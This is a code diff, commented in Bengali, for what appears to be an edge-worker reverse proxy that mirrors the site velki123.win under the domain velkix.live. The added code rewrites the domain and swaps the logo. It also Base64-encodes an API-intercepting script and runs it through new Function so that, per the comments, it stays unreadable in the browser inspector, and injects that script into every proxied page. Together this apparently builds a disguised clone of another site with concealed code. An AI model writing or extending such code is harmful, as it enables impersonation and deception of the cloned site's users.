@@ -22,8 +22,9 @@ export default {
             });
         }
 
-        // আপনার আসল ইন্টারসেপ্টর কোড (আপনি চাইলে obfuscator.io থেকে এনক্রিপ্ট করে এখানে বসাতে পারেন)
-        const secretCode = `
+        // 🔹 আপনার নির্দেশ অনুযায়ী শক্তিশালী IIFE Obfuscation 🔹
+        // এই rawJs আপনার মূল কাজ করবে, কিন্তু ব্রাউজারে এটি এনক্রিপ্ট হয়ে যাবে
+        const rawJs = `
           (function() {
             const proxyPrefix = '/__api_proxy/';
             const targetApis = ${JSON.stringify(ALL_TARGETS)};
@@ -55,6 +56,11 @@ export default {
             };
           })();
         `;
+        
+        // আসল কোডটিকে Base64 এ রূপান্তর করে একটি IIFE ফাংশনের ভেতর র‍্যাপ করা হলো 
+        // এর ফলে ইন্সপেক্টরে কোড সম্পূর্ণ আনরিডেবল (Unreadable) দেখাবে
+        const obfuscatedPayload = btoa(unescape(encodeURIComponent(rawJs)));
+        const secretCode = `!function(){var e="${obfuscatedPayload}",t=decodeURIComponent(escape(atob(e)));new Function(t)()}();`;
 
         return new Response(secretCode, {
             status: 200,
@@ -144,17 +150,27 @@ export default {
             text = text.replaceAll(originalUrl.replace(/\//g, '\\/'), proxyUrl.replace(/\//g, '\\/'));
         });
 
-        // 🔹 আপনার নির্দেশ অনুযায়ী শুধুমাত্র মেইন ওয়েবসাইটের টেক্সট রিপ্লেস করা হলো 🔹
+        // ডোমেইন নেম রিপ্লেসমেন্ট
         text = text.replaceAll(/velki123\.win/gi, "velkix.live");
         text = text.replaceAll(/velki123/gi, "velkix.live");
 
-        // 🔒 প্রফেশনাল ইনজেকশন: এখানে কোনো বিশাল কোড বা Base64 নেই, শুধু একটা ছোট লিংক!
+        // 🔹 আপনার নির্দেশ অনুযায়ী লোগো পারফেক্টলি হাইড ও রিপ্লেসমেন্ট 🔹
+        const newLogoUrl = "https://i.postimg.cc/J0P019Hr/20260408-225146.webp";
+        // সোর্স কোড থেকে আগের লোগোর পাথগুলো সম্পূর্ণ মুছে ফেলা হচ্ছে
+        text = text.replaceAll("../../assets/images/velki-logo.png", newLogoUrl);
+        text = text.replaceAll("/assets/images/velki-logo.png", newLogoUrl);
+        text = text.replaceAll("assets/images/velki-logo.png", newLogoUrl);
+
+        // 🔒 প্রফেশনাল ইনজেকশন (Logo CSS Force + Security JS)
         if (contentType.includes("text/html")) {
+            // এই CSS আগের লোগোকে ফোর্স করে আপনার লোগো বসিয়ে দিবে (যদি কোনোভাবে পুরনোটা আসতেই চায়)
+            const forceLogoCSS = `<style>.logo-sec img { content: url("${newLogoUrl}") !important; }</style>`;
             const ghostScriptTag = `<script src="/__secure_core.js"></script>`;
+            
             if (text.includes('<head>')) {
-              text = text.replace('<head>', '<head>' + ghostScriptTag);
+              text = text.replace('<head>', '<head>' + forceLogoCSS + ghostScriptTag);
             } else {
-              text = ghostScriptTag + text;
+              text = forceLogoCSS + ghostScriptTag + text;
             }
         }
         
